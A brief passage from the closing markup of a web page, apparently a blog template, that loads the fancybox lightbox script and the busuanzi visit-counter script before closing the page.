src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
